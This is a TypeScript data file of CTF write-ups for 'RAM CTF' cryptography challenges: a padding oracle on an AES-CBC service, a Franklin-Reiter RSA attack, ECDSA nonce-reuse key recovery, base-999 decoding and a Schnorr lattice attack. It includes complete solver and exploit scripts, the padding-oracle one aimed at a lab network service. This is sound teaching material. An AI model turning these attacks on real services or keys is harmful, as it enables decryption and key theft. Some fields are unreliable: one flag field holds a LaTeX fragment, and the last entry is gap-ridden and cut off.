import type { WriteUp } from '../types';

// RAM — 20 writeups
export const ramWriteups: WriteUp[] = [
  {
    "id": "ram-crypto-delhi",
    "title": "CTF — Delphi Protocol 1",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "RAM",
    "tags": [],
    "description": "CTF Writeup — Delphi Protocol 1",
    "problemDescription": "CTF Writeup — Delphi Protocol 1\n\nEvent: RAM CTF\nCategory: Cryptography\nDifficulty: Medium\nFlag: RMCTF{S0M3WH4T_S5331N6_0RAC13}\n\nChallenge Description\n\nWe have managed to get you access to an API that queries the general channel of Ironclad.ai, an AI-powered cryptography startup rewriting cryptography libraries. Attached is the source code we managed to pull from a developer's abandoned laptop. See if you can decrypt their communications, and find out what they're working on.\n\nTarget: 10.42.5.10:1337\n\nReconnaissance\n\nStep 1 — Setup VPN Connection\n\nThe challenge provides a WireGuard configuration file (ram.conf). The first step is to establish a connection to the internal network.\n\nsudo wg-quick up ./ram.conf\n\n\nVerify the connection:\n\nping -c 4 10.42.5.10\n\n\nStep 2 — Inspect the Target Service\n\nConnecting to the target port using netcat reveals an internal log access portal.\n\nnc 10.42.5.10 1337\n\n\nOutput:\n\nDelphi Backend Portal - Internal Log Access\n\nIntercepted Transmission:\n  token : b99900dabcf8a858... (long hex string)\n  iv    : a52c6283ebe553b0a1962db103364147\n\nCommands:\n  DECRYPT iv_hex token_hex\n  QUIT\n\n\nThe server provides a ciphertext (token), an Initialization Vector (iv), and a command to perform decryption. The name \"Delphi\" (referencing the Oracle of Delphi) strongly hints at a Padding Oracle Attack.\n\nExploitation\n\nStep 3 — Confirm Padding Oracle Vulnerability\n\nTo confirm the vulnerability, we need to test how the server handles invalid padding. We send the original IV and token, but modify the last byte of the token.\n\n$ DECRYPT a52c6283ebe553b0a1962db103364147 b99900dabcf8a858...7b7b\n\n\nResponse:\n\nERROR: malformed token\n\n\nThe server responds with a specific error message (ERROR: malformed token) when the PKCS#7 padding is invalid. If the padding is correct, this error does not appear. This behavior confirms the server acts as a padding oracle.\n\nStep 4 — Exploit via Automated Script\n\nSince the target uses AES-CBC, we can manipulate the ciphertext of the previous block ($C_{i-1}$) to alter the plaintext of the current block ($P_i$) during decryption. By brute-forcing the bytes from right to left and observing the server's response, we can deduce the plaintext byte by byte.\n\nWe use a Python script with pwntools to automate this process.\n\nfrom pwn import *\n\nHOST = '10.42.5.10'\nPORT = 1337\nIV_HEX = \"a52c6283ebe553b0a1962db103364147\"\nTOKEN_HEX = \"b99900dabcf8a858230682b42866bcd54682f74bee28b0f58f5c943385bf55bdb6139dc85cb922bfb640bf21d6ef18b331c79b525e448a4dcd2500770cac740cb7bde0118b163ec4850832e315ed964add24c589dd12d368e007a253d28c7918b51d4f7352389cbd14c12ce77322cb63440116d40f0faca0f07a0942a06d90167ff020e5ea1d67d6d4e6d63284a71021a67f7b7be8ac1c5e5e93a1b4bdff3a7cb7bf61777a0e153af17132ff3d4d833fb90d109514e0ee5533f83c2604060e92818ba56a2691ce139c6d9ee554bdd04cc47f9f8d6ea19eda3bf606d7dea182cab2df99668f5d669a70c39b8f14a33d32b7ce0c8628e59f7ee245d1c27306e092ac4208787772d3e39c8c54506912ee8017f54cb35d9488f60a89c8b510b3ce5038c4e5ee0233dcbdd5bfe5874b84f27308832f78da5c6c40df5a09f1db5746c2d8cda59bed2969804b14822e0d9cb52730d2e683c834ab42ba7215d985cb68ec20079eabcc15f36d5b1a24f5d19b88817c0fcbc55675d9dad7be3fd3b802d3b5010937f42a4cbc0a23fa94a7f83e7b7a\"\n\nr = remote(HOST, PORT)\nr.recvuntil(b'$ ')\n\ndef oracle(iv_test, ct_test):\n    r.sendline(f\"DECRYPT {iv_test.hex()} {ct_test.hex()}\".encode())\n    return b\"malformed token\" not in r.recvuntil(b'$ ')\n\n\n\nStep 5 — Retrieve the Decrypted Text\n\nRunning the script block by block eventually reconstructs the entire plaintext, revealing the flag hidden within the communications.\n\nFlag\n\nRMCTF{S0M3WH4T_S5331N6_0RAC13}",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\n\r\n# Biar output terminalnya rapi, gak spam log pwntools\r\ncontext.log_level = 'info'\r\n\r\nHOST = '10.42.5.10'\r\nPORT = 1337\r\n\r\nIV_HEX = \"a52c6283ebe553b0a1962db103364147\"\r\nTOKEN_HEX = \"b99900dabcf8a858230682b42866bcd54682f74bee28b0f58f5c943385bf55bdb6139dc85cb922bfb640bf21d6ef18b331c79b525e448a4dcd2500770cac740cb7bde0118b163ec4850832e315ed964add24c589dd12d368e007a253d28c7918b51d4f7352389cbd14c12ce77322cb63440116d40f0faca0f07a0942a06d90167ff020e5ea1d67d6d4e6d63284a71021a67f7b7be8ac1c5e5e93a1b4bdff3a7cb7bf61777a0e153af17132ff3d4d833fb90d109514e0ee5533f83c2604060e92818ba56a2691ce139c6d9ee554bdd04cc47f9f8d6ea19eda3bf606d7dea182cab2df99668f5d669a70c39b8f14a33d32b7ce0c8628e59f7ee245d1c27306e092ac4208787772d3e39c8c54506912ee8017f54cb35d9488f60a89c8b510b3ce5038c4e5ee0233dcbdd5bfe5874b84f27308832f78da5c6c40df5a09f1db5746c2d8cda59bed2969804b14822e0d9cb52730d2e683c834ab42ba7215d985cb68ec20079eabcc15f36d5b1a24f5d19b88817c0fcbc55675d9dad7be3fd3b802d3b5010937f42a4cbc0a23fa94a7f83e7b7a\"\r\n\r\nERROR_MSG = b\"malformed token\"\r\nBLOCK_SIZE = 16\r\n\r\niv = bytes.fromhex(IV_HEX)\r\nciphertext = bytes.fromhex(TOKEN_HEX)\r\n\r\nr = remote(HOST, PORT)\r\n# Ngelewatin banner awal sampai muncul prompt '$ '\r\nr.recvuntil(b'$ ')\r\n\r\ndef oracle(iv_test, ct_test):\r\n    cmd = f\"DECRYPT {iv_test.hex()} {ct_test.hex()}\".encode()\r\n    r.sendline(cmd)\r\n    \r\n    # Baca semua response sampai ketemu prompt '$ ' lagi\r\n    response = r.recvuntil(b'$ ')\r\n    \r\n    if ERROR_MSG in response:\r\n        return False\r\n    return True\r\n\r\ndef crack_block(prev_block, curr_block, block_num):\r\n    intermediate = bytearray(BLOCK_SIZE)\r\n    decrypted_block = bytearray(BLOCK_SIZE)\r\n    \r\n    p = log.progress(f'Cracking Block {block_num}')\r\n\r\n    for i in range(1, BLOCK_SIZE + 1):\r\n        padding_val = i\r\n        iv_test = bytearray(BLOCK_SIZE)\r\n        \r\n        # Set byte yang udah ketemu\r\n        for j in range(1, i):\r\n            iv_test[-j] = intermediate[-j] ^ padding_val\r\n            \r\n        # Brute force byte saat ini\r\n        for guess in range(256):\r\n            iv_test[-i] = guess\r\n            \r\n            if oracle(iv_test, curr_block):\r\n                # Edge case: byte pertama\r\n                if i == 1:\r\n                    iv_test[-2] ^= 0x01\r\n                    if not oracle(iv_test, curr_block):\r\n                        continue\r\n                \r\n                intermediate[-i] = guess ^ padding_val\r\n                decrypted_block[-i] = prev_block[-i] ^ intermediate[-i]\r\n                \r\n                p.status(f'Byte {16-i}: {chr(decrypted_block[-i]) if 32 <= decrypted_block[-i] <= 126 else hex(decrypted_block[-i])}')\r\n                break\r\n                \r\n    p.success(f'Decrypted: {bytes(decrypted_block)}')\r\n    return bytes(decrypted_block)\r\n\r\ndef main():\r\n    blocks = [iv] + [ciphertext[i:i+BLOCK_SIZE] for i in range(0, len(ciphertext), BLOCK_SIZE)]\r\n    plaintext = b\"\"\r\n    \r\n    log.info(f\"Total blocks to crack: {len(blocks) - 1}\")\r\n    \r\n    for i in range(1, len(blocks)):\r\n        decrypted_block = crack_block(blocks[i-1], blocks[i], i)\r\n        plaintext += decrypted_block\r\n        \r\n    # Buang padding PKCS#7\r\n    pad_len = plaintext[-1]\r\n    unpadded = plaintext[:-pad_len]\r\n    \r\n    print(\"\\n\" + \"=\"*50)\r\n    print(\"[+] FULL DECRYPTED DATA:\")\r\n    print(unpadded.decode(errors='ignore'))\r\n    print(\"=\"*50 + \"\\n\")\r\n\r\nif __name__ == '__main__':\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "RMCTF{S0M3WH4T_S5331N6_0RAC13}",
    "lessonsLearned": ""
  },
  {
    "id": "ram-crypto-eanasirsecure",
    "title": "CTF — Ea Nasir Secure",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "RAM",
    "tags": [],
    "description": "CTF Writeup — Ea Nasir Secure",
    "problemDescription": "CTF Writeup — Ea Nasir Secure\n\nEvent: (Nama Event CTF, misal: RAM CTF)\nCategory: Cryptography\nDifficulty: Medium\nFlag: RMCTF{C0PP3r_vs_S733L}\n\nChallenge Description\n\ngibson has taught the employees at steelsecure to use RSA to secure their work, but we don't trust it entirely. Enclosed is the source for their encryption, and an output.txt we salvaged from an abandoned laptop.\n\nReconnaissance\n\nWe are provided with two files: chall.py (the encryption script) and output.txt (the resulting encrypted data).\n\nStep 1 — Analyze the Encryption Script (chall.py)\nLooking at the source code, we can see a standard RSA setup but with a twist on how the message is encrypted:\n\ndef generate_params():\n    e = 3\n    p = getPrime(512)\n    q = getPrime(512)\n    n = p * q\n    return n, e\n\ndef main():\n    n, e = generate_params()\n    m = bytes_to_long(FLAG)\n\n    a = random.randint(2, 100)\n    b = random.randint(1, 2**32)\n    c = random.randint(2, 100)\n    d = random.randint(1, 2**32)\n\n    m1 = (a * m + b) % n\n    m2 = (c * m + d) % n\n\n    c1 = pow(m1, e, n)\n    c2 = pow(m2, e, n)\n    # ... prints outputs ...\n\n\nKey observations:\n\nSmall Public Exponent: The exponent used is $e = 3$.\n\nRelated Messages: The exact same message $m$ (the flag) is used to create two different plaintexts, $m_1$ and $m_2$, using a linear relationship:\n\n$m_1 = a \\cdot m + b \\pmod n$\n\n$m_2 = c \\cdot m + d \\pmod n$\n\nThese related plaintexts are then encrypted to produce $c_1$ and $c_2$.\n\nStep 2 — Review the Output (output.txt)\nThe output.txt file provides us with all the necessary public information to launch an attack:\n\nThe modulus $n$\n\nThe exponent $e = 3$\n\nThe two ciphertexts $c_1$ and $c_2$\n\nThe exact values of the linear coefficients:\n\n$a = 70$, $b = 2706420314$\n\n$c = 3$, $d = 2929618574$\n\nExploitation\n\nStep 3 — Identify the Vulnerability\nThis is a textbook scenario for the Franklin-Reiter Related Message Attack. When two related messages (where the relationship is a known linear function) are encrypted using RSA with the same modulus $n$ and the same small exponent $e$ (typically $e=3$), it is possible to recover the original message $m$.\n\nMathematically, we know that:\n\n$c_1 \\equiv (a \\cdot m + b)^e \\pmod n$\n\n$c_2 \\equiv (c \\cdot m + d)^e \\pmod n$\n\nWe can define two polynomials in the ring $\\mathbb{Z}_n[x]$:\n\n$f_1(x) = (a \\cdot x + b)^e - c_1$\n\n$f_2(x) = (c \\cdot x + d)^e - c_2$\n\nSince $m$ is a root for both equations, the binomial $(x - m)$ must be a common factor of both polynomials. By calculating the Greatest Common Divisor (GCD) of $f_1$ and $f_2$, we will be left with the linear polynomial $(x - m)$, allowing us to extract $m$.\n\nStep 4 — Develop the Solver Script\nTo calculate the GCD of polynomials over a modulo ring efficiently, we use SageMath.\n\nfrom Crypto.Util.number import long_to_bytes\n\nn = 98237543086838092972727647602649684412823690703586018468107564793518052420849467378972960087089904634059300894743876081610848224988135902506827923518956599452500642947331481355296570045228580344605876571313298325475476590965722009164468025644000368474389606511878244554300783192096414689616993763058583937333\ne = 3\nc1 = 10014749067983552801777308442259360701131069253434425322498731759314630313146300050356987559850355269257216025931575623364251535349426572721190934970466052609892864\nc2 = 788333017013282582064102996912544428368918059912083172803001714562442559798914489707221771582656784173467830862787901677858526810864572559845148224601602432125\na, b = 70, 2706420314\nc, d = 3, 2929618574\n\nP.<x> = PolynomialRing(Zmod(n))\n\nf1 = (a*x + b)^e - c1\nf2 = (c*x + d)^e - c2\n\ndef gcd(g1, g2):\n    while g2:\n        g1, g2 = g2, g1 % g2\n    return g1.monic()\n\nresult = gcd(f1, f2)\n\nm = -result.coefficients()[0]\n\nprint(long_to_bytes(int(m)).decode())\n\n\nStep 5 — Execution\nRunning the SageMath script recovers the integer $m$, which when converted back to bytes yields the flag.\n\nFlag\n\nRMCTF{C0PP3r_vs_S733L}\n\nVulnerability Summary\n\n#\n\nVulnerability Detail\n\n1\n\nFranklin-Reiter Related Message Attack\n\n2\n\nSmall Public Exponent ($e=3$)\n\nRemediation\n\nUse Proper Padding: Always use standardized padding schemes like OAEP (Optimal Asymmetric Encryption Padding) when using RSA. Padding introduces randomness into the plaintext before encryption, completely destroying the linear relationship required for this attack.\n\nIncrease Public Exponent: While padding is the primary defense, using a larger public exponent (commonly $e = 65537$) prevents a wider class of algebraic attacks (like Coppersmith's attack) that exploit small exponents.\n\nTools Used\n\nSageMath — Used for its advanced algebraic capabilities, specifically defining polynomial rings over $\\mathbb{Z}_n$ and computing their GCD.\n\nAttack Flow\n\nAnalyze chall.py & output.txt\n      │\n      ▼\nIdentify RSA with e=3 and linearly related messages (m1, m2)\n      │\n      ▼\nConstruct polynomials: f1(x) = (ax+b)³ - c1, f2(x) = (cx+d)³ - c2\n      │\n      ▼\nUse SageMath to compute the polynomial GCD of f1 and f2 over Z_n\n      │\n      ▼\nExtract the root of the resulting linear binomial (x - m)\n      │\n      ▼\nConvert integer m to bytes → RMCTF{C0PP3r_vs_S733L}",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.sage) is provided below:",
        "code": "from Crypto.Util.number import long_to_bytes\r\n\r\n# Data dari output.txt\r\nn = 98237543086838092972727647602649684412823690703586018468107564793518052420849467378972960087089904634059300894743876081610848224988135902506827923518956599452500642947331481355296570045228580344605876571313298325475476590965722009164468025644000368474389606511878244554300783192096414689616993763058583937333\r\ne = 3\r\nc1 = 10014749067983552801777308442259360701131069253434425322498731759314630313146300050356987559850355269257216025931575623364251535349426572721190934970466052609892864\r\nc2 = 788333017013282582064102996912544428368918059912083172803001714562442559798914489707221771582656784173467830862787901677858526810864572559845148224601602432125\r\n\r\n# Parameter linear dari komentar\r\na, b = 70, 2706420314\r\nc, d = 3, 2929618574\r\n\r\ndef franklin_reiter(n, e, c1, c2, a, b, c, d):\r\n    # Inisialisasi Ring Polinomial di mod n\r\n    P.<x> = PolynomialRing(Zmod(n))\r\n    \r\n    # Definisikan dua polinomial yang akarnya adalah m\r\n    f1 = (a*x + b)^e - c1\r\n    f2 = (c*x + d)^e - c2\r\n    \r\n    # Mencari GCD dari f1 dan f2\r\n    # Hasilnya akan berupa polinomial linear (x - m)\r\n    def gcd(g1, g2):\r\n        while g2:\r\n            g1, g2 = g2, g1 % g2\r\n        return g1.monic()\r\n\r\n    result = gcd(f1, f2)\r\n    \r\n    # Koefisien konstan dari (x - m) adalah -m\r\n    # Maka m = -konstan\r\n    m = -result.coefficients()[0]\r\n    return int(m)\r\n\r\nm_recovered = franklin_reiter(n, e, c1, c2, a, b, c, d)\r\nprint(\"Flag found:\")\r\nprint(long_to_bytes(m_recovered).decode())"
      }
    ],
    "terminalOutputs": [],
    "flag": "RMCTF{C0PP3r_vs_S733L}",
    "lessonsLearned": ""
  },
  {
    "id": "ram-crypto-gibson2026",
    "title": "gibson vs 2006",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "RAM",
    "tags": [],
    "description": "CTF Writeup: gibson vs 2006",
    "problemDescription": "CTF Writeup: gibson vs 2006\n\nChallenge Overview\n\nThe \"gibson vs 2006\" challenge provides an ECDSA (Elliptic Curve Digital Signature Algorithm) output file containing two messages signed with the same private key. The title and the flag hint at the infamous 2010 Sony PlayStation 3 security breach, where a failure in random number generation compromised the system's master key.\n\nData Analysis\n\nLooking at output.txt, we are given the following values:\n\nMessage 1 Hash ($z_1$): 0x3f12c87a7847acffea7cbbda8e65cfbbcaa987124424861b754773f48f9099cf\n\nMessage 2 Hash ($z_2$): 0x45e656fff1a82884c860a495cb39c1e8634992e4e10c21887d64250c39e3c9bd\n\nSignature $r$: 0xf1f9868668a5add66dd96d6712eab1fe6a94da480e2863a1671864b927b29494\n\nSignature $s_1$: 0xf6b890ba847741d34aace32aec779d81c41006d6b710e203deedb8442ff613f2\n\nSignature $s_2$: 0x8d30c4a40494387ed709bdd069c059e6303f8e0087646b69ea5d4933598f5a8d\n\nCrucial Observation: The value of $r$ is identical for both signatures. In ECDSA, $r$ is derived from a \"nonce\" ($k$). If $r$ is reused across different messages, it implies the same $k$ was used, which leads to a total collapse of the private key's security.\n\nThe Math\n\nAn ECDSA signature $s$ is calculated as:\n\n\n$$s \\equiv k^{-1}(z + rd) \\pmod n$$\n\n\nWhere:\n\n$k$ is the nonce.\n\n$z$ is the message hash.\n\n$r$ is the x-coordinate of the curve point.\n\n$d$ is the private key.\n\n$n$ is the order of the curve.\n\nWhen $k$ is reused, we have two equations:\n\n$s_1 \\equiv k^{-1}(z_1 + rd) \\pmod n$\n\n$s_2 \\equiv k^{-1}(z_2 + rd) \\pmod n$\n\nSubtracting the two equations allows us to solve for $k$:\n\n\n$$s_1 - s_2 \\equiv k^{-1}(z_1 - z_2) \\pmod n$$\n\n$$k \\equiv \\frac{z_1 - z_2}{s_1 - s_2} \\pmod n$$\n\nOnce $k$ is known, we isolate the private key $d$:\n\n\n$$d \\equiv \\frac{s_1k - z_1}{r} \\pmod n$$\n\nExploitation Script\n\nUsing Python and the secp256k1 curve order (standard for most crypto challenges), we can automate the recovery:\n\nfrom Crypto.Util.number import inverse, long_to_bytes\n\nn = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141\n\nz1 = 0x3f12c87a7847acffea7cbbda8e65cfbbcaa987124424861b754773f48f9099cf\nr  = 0xf1f9868668a5add66dd96d6712eab1fe6a94da480e2863a1671864b927b29494\ns1 = 0xf6b890ba847741d34aace32aec779d81c41006d6b710e203deedb8442ff613f2\n\nz2 = 0x45e656fff1a82884c860a495cb39c1e8634992e4e10c21887d64250c39e3c9bd\ns2 = 0x8d30c4a40494387ed709bdd069c059e6303f8e0087646b69ea5d4933598f5a8d\n\nk = ((z1 - z2) * inverse(s1 - s2, n)) % n\n\nd = ((s1 * k - z1) * inverse(r, n)) % n\n\nprint(f\"Private Key (hex): {hex(d)}\")\nprint(f\"Flag: {long_to_bytes(d).decode()}\")\n\n\nConclusion\n\nThe script recovers the private key $d$, which when converted from hex to ASCII, reveals the flag. This challenge demonstrates why cryptographically secure pseudo-random number generators (CSPRNG) are vital—reusing a single $k$ is equivalent to handing over the private key.\n\nFlag: RMCTF{ps3_h4unt3d_n0nc3}",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "from Crypto.Util.number import inverse\r\n\r\ndef solve_ecdsa_nonce_reuse():\r\n    # Parameter Kurva secp256k1 (Order n)\r\n    n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141\r\n\r\n    # Data dari output.txt\r\n    z1 = 0x3f12c87a7847acffea7cbbda8e65cfbbcaa987124424861b754773f48f9099cf\r\n    r  = 0xf1f9868668a5add66dd96d6712eab1fe6a94da480e2863a1671864b927b29494\r\n    s1 = 0xf6b890ba847741d34aace32aec779d81c41006d6b710e203deedb8442ff613f2\r\n\r\n    z2 = 0x45e656fff1a82884c860a495cb39c1e8634992e4e10c21887d64250c39e3c9bd\r\n    s2 = 0x8d30c4a40494387ed709bdd069c059e6303f8e0087646b69ea5d4933598f5a8d\r\n\r\n    print(\"[*] Menghitung k (nonce)...\")\r\n    # k = (z1 - z2) * inv(s1 - s2) mod n\r\n    k = ((z1 - z2) * inverse(s1 - s2, n)) % n\r\n    \r\n    print(\"[*] Menghitung private key (d)...\")\r\n    # d = (s1 * k - z1) * inv(r) mod n\r\n    d = ((s1 * k - z1) * inverse(r, n)) % n\r\n\r\n    print(\"-\" * 20)\r\n    print(f\"Private Key (Decimal): {d}\")\r\n    print(f\"Private Key (Hex): {hex(d)}\")\r\n    \r\n    # Mencoba decode ke string jika flag ada di dalam key\r\n    try:\r\n        flag = bytes.fromhex(hex(d)[2:]).decode('utf-8')\r\n        print(f\"Flag (String): {flag}\")\r\n    except:\r\n        pass\r\n\r\nif __name__ == \"__main__\":\r\n    solve_ecdsa_nonce_reuse()"
      }
    ],
    "terminalOutputs": [],
    "flag": "frac{z_1 - z_2}",
    "lessonsLearned": ""
  },
  {
    "id": "ram-crypto-nine",
    "title": "CTF — Nine Strings, Nine Bytes, Nine Nines?",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "RAM",
    "tags": [],
    "description": "CTF Writeup — Nine Strings, Nine Bytes, Nine Nines?",
    "problemDescription": "CTF Writeup — Nine Strings, Nine Bytes, Nine Nines?\n\nEvent: RAM CTF\n\nCategory: Crypto\n\nDifficulty: Easy\n\nFlag: RAM{M0rPH063N371C_F131D}\n\nChallenge Description\n\nsteelsecure.ai have switched to a new url-safe data transmission method that we don't understand. As always, our insider has access to the api they use to create these url-safe strings, but we are no closer to working out how they work.\n\nTarget File: output.txt\n\nConnection: nc 10.42.5.10 9999\n\nReconnaissance\n\nStep 1 — Analyze Output File\n\nFile output.txt berisi tiga baris data dengan format [integer]:[string_angka_panjang].\n\n75:001452364189...\n33:008254923251...\n24:002055539561...\n\n\nAngka di depan titik dua sepertinya menunjukkan panjang byte dari pesan asli, sedangkan string angka adalah data yang terenkripsi/terkode.\n\nStep 2 — Interact with the Server\n\nMenghubungkan ke server menggunakan netcat memberikan informasi krusial di banner:\n\n==============================================\nState of the art encoding by steelsecure.ai\nCommands:\n  encode <text>   — encode a string\n  decode <text>   — decode a base-999 string (UNDER MAINT!)\n==============================================\n\n\nBanner tersebut secara eksplisit menyebutkan \"Base-999 string\". Judul tantangan \"Nine Strings, Nine Bytes, Nine Nines?\" juga mengonfirmasi penggunaan angka 9.\n\nExploitation\n\nStep 3 — Pattern Analysis\n\nDalam Base-999, setiap \"digit\" dari sistem bilangan tersebut bernilai maksimal 998. Karena $999$ mendekati $1000$ ($10^3$), maka cara paling masuk akal untuk merepresentasikan satu digit Base-999 dalam string desimal adalah dengan menggunakan 3 digit angka (000 hingga 998).\n\nContoh: String 008254...\n\nDigit ke-1: 008 (Nilai: 8)\n\nDigit ke-2: 254 (Nilai: 254)\n\nStep 4 — Mathematical Decoding\n\nUntuk mengembalikan data ke bentuk aslinya, kita harus:\n\nMemecah string menjadi blok sepanjang 3 karakter.\n\nMenghitung nilai total desimal (Big Integer) menggunakan rumus:\n\n\n$$V = \\sum_{i=0}^{n-1} d_i \\cdot 999^{(n-1-i)}$$\n\nMengonversi integer $V$ tersebut kembali menjadi bytes sesuai dengan panjang yang diberikan di awal.\n\nStep 5 — Automated Script\n\nMenggunakan Python untuk melakukan konversi otomatis pada data di output.txt:\n\ndef solve_base999(encoded_data, byte_len):\n    # Pecah per 3 digit\n    chunks = [int(encoded_data[i:i+3]) for i in range(0, len(encoded_data), 3)]\n    \n    # Konversi Base-999 ke Integer\n    val = 0\n    for c in chunks:\n        val = val * 999 + c\n        \n    # Konversi Integer ke Bytes\n    return val.to_bytes(byte_len, 'big').decode()\n\npayload = \"001452364189848287923821742568954303648698985244216888407919381357574656595589327310217711904601016561079226903056403550476359808600659903252340182702873643487914166139407119810527154\"\nprint(solve_base999(payload, 75))\n\n\nMenjalankan script tersebut pada baris pertama menghasilkan flag yang dicari.\n\nFlag\n\nRAM{M0rPH063N371C_F131D}",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "def decode_base999(encoded_str, byte_len):\r\n    # 1. Pecah string menjadi blok 3 digit (Base-999 digits)\r\n    chunks = [encoded_str[i:i+3] for i in range(0, len(encoded_str), 3)]\r\n    \r\n    # 2. Konversi dari Base-999 ke Integer Besar\r\n    decimal_value = 0\r\n    for chunk in chunks:\r\n        decimal_value = decimal_value * 999 + int(chunk)\r\n    \r\n    # 3. Konversi Integer ke Bytes\r\n    try:\r\n        flag_bytes = decimal_value.to_bytes(byte_len, 'big')\r\n        return flag_bytes.decode('utf-8', errors='ignore')\r\n    except Exception as e:\r\n        return f\"[Error] Gagal decode: {e}\"\r\n\r\n# Data dari output.txt\r\ndata = [\r\n    (75, \"001452364189848287923821742568954303648698985244216888407919381357574656595589327310217711904601016561079226903056403550476359808600659903252340182702873643487914166139407119810527154\"),\r\n    (33, \"008254923251891373997947374522236000703540039225601391676590188700537882880174791\"),\r\n    (24, \"002055539561030522839955247651389777708129343862662007097150\")\r\n]\r\n\r\nprint(\"=== Hasil Decoding ===\")\r\nfor i, (length, enc_str) in enumerate(data):\r\n    result = decode_base999(enc_str, length)\r\n    print(f\"String {i+1}: {result}\")"
      }
    ],
    "terminalOutputs": [],
    "flag": "RAM{M0rPH063N371C_F131D}",
    "lessonsLearned": ""
  },
  {
    "id": "ram-crypto-thesteel",
    "title": "CTF — That Steel Really Is Secure",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "RAM",
    "tags": [],
    "description": "**Event:** RAM CTF  \n**Category:** Crypto  \n**Difficulty:** Medium / Hard  \n**Flag:** `RAM{1_10V3_M47r1C35_P13453_D0N7_F1r3_M3}`",
    "problemDescription": "**Event:** RAM CTF  \n**Category:** Crypto  \n**Difficulty:** Medium / Hard  \n**Flag:** `RAM{1_10V3_M47r1C35_P13453_D0N7_F1r3_M3}`\n\n---",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> Threatened with termination over continued failures, the overburdened hero Junior Dev 1 has tried one last time to invoke gibson to create a scheme that is truly secure (And under the terms of the steelsecure licence!) They're so confident, that they have even open sourced the signature scheme.\n>\n> You know what to do.\n\nDiberikan dua file utama:\n\n\n\n`chall.py` berisi implementasi custom signature scheme, sedangkan `output.txt` berisi public key, beberapa pasangan message-signature, ciphertext, dan IV.\n\n---",
        "code": "output.txt\nchall.py"
      },
      {
        "title": "Step 1 — Identify Crypto Primitive",
        "content": "Dari source code:\n\n\n\nTerlihat bahwa skema ini bekerja pada grup modulo prime `p`.\n\nPrivate key:\n\n\n\nPublic key:\n\n\n\nSignature scheme-nya mirip **Schnorr signature**:\n\n\n\nVerification:\n\n\n\nKarena:\n\n\n\nmaka:\n\n\n\nJadi secara konsep, signature valid.\n\nTarget akhirnya adalah mendapatkan `x`, karena flag dienkripsi menggunakan AES key turunan dari `x`:\n\n\n\n---",
        "code": "p = 148982911401264734500617017580518449923542719532318121475997727602675813514863\ng = 2\nassert isPrime(p // 2)\n\nx = randrange(p)\ny = pow(g, x, p)"
      },
      {
        "title": "Step 2 — Check Nonce Generation",
        "content": "Bagian paling penting ada di nonce `k`:\n\n\n\nFungsi XOR:\n\n\n\nMasalahnya:\n\n1. `otp` hanya dibuat sekali.\n2. `otp` dipakai ulang untuk semua message.\n3. Nonce `k` bukan random murni, tetapi:\n\n\n\ndengan:\n\n\n\nKarena `otp` sama untuk semua signature, semua nonce saling berhubungan.\n\nIni fatal untuk Schnorr-like signature.\n\n---",
        "code": "otp = os.urandom(32)\n\nfor message in messages:\n    k = bytes_to_long(xor(pad(message, 32)[::-1], otp))\n    s, e = sign(message, k % p)"
      },
      {
        "title": "Mathematical Model",
        "content": "Dari signature:\n\n\n\nMisalkan:\n\n\n\nMaka untuk setiap signature:\n\n\n\natau:\n\n\n\nKarena `k_i` berasal dari XOR dengan OTP:\n\n\n\ndengan `P_i` diketahui dari message.\n\n---",
        "code": "s = (k - x * e) % (p - 1)"
      },
      {
        "title": "Step 3 — Convert XOR Nonce Into Linear Form",
        "content": "Walaupun XOR bukan linear terhadap integer biasa, XOR dengan nilai yang diketahui bisa ditulis sebagai ekspresi linear terhadap bit-bit OTP.\n\nUntuk setiap bit OTP `b_j ∈ {0,1}`:\n\n\n\nSehingga:\n\n\n\ndengan:\n\n\n\nArtinya setiap nonce bisa dimodelkan sebagai persamaan linear atas bit-bit OTP.\n\n---",
        "code": "jika bit P_i[j] = 0:\n    bit k_i[j] = b_j\n\njika bit P_i[j] = 1:\n    bit k_i[j] = 1 - b_j"
      },
      {
        "title": "Step 4 — Eliminate Private Key `x`",
        "content": "Dari dua signature:\n\n\n\nKurangkan:\n\n\n\nMisalkan:\n\n\n\nMaka:\n\n\n\nUntuk menghilangkan `x`, ambil dua indeks berbeda:\n\n\n\nHasilnya adalah beberapa persamaan modular linear yang hanya berisi bit-bit OTP.\n\nIni menjadi problem:\n\n\n\ndengan `b_j ∈ {0,1}`.\n\nProblem seperti ini bisa diselesaikan dengan lattice reduction / LLL.\n\n---",
        "code": "k_i - s_i ≡ x e_i mod N\nk_0 - s_0 ≡ x e_0 mod N"
      },
      {
        "title": "Step 5 — Build Lattice and Recover OTP Bits",
        "content": "Saya menggunakan LLL untuk menemukan vector pendek berisi bit-bit OTP.\n\nCore idea lattice embedding:\n\n\n\nJika tebakan bit benar, bagian modular menjadi nol dan bagian bit menjadi `±1`.\n\nsolver di solve.sage\nuntuk mendapakan value x di get_x.py\ndecrypt di flag.py\n\n---",
        "code": "v = last_row - Σ b_j row_j - Σ z_i modulus_row_i"
      },
      {
        "title": "Decryption",
